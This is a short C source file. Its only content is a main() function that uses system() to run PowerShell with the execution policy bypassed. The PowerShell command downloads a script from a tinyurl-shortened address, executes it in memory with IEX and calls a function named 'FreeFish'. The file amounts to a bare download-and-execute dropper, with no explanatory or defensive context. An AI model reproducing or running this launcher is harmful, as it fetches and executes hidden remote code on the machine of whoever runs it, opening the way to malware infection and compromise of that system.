#include <stdio.h>

int main(){
    system("powershell -executionpolicy bypass \"IEX (New-Object Net.WebClient).DownloadString('http://tinyurl.com/p6fjrmw'); FreeFish\"");
}

